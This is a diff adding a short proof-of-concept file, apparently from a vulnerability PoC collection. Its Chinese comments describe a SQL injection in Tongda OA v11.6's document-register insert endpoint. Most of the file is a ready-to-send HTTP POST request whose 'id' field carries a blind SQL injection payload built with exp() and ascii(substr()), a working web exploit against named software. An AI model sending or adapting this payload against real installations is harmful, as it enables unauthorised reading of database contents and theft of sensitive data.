@@ -1,0 +1,10 @@
+# 通达OA v11.6 insert SQL注入漏洞
+# 通达OA v11.6 insert 存在SQL注入漏洞，攻击者通过此漏洞可以获取数据库敏感信息
+POST /general/document/index.php/recv/register/insert?acid=80025420&bid=hd_tag_m8mv260l HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv260l
+RM-PRO-Token: e23a3cb1486c53288931d5359cddaa20
+RM-PRO-Time: 1742808520520
+User-Agent: curl/7.83.1
+
+id=title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
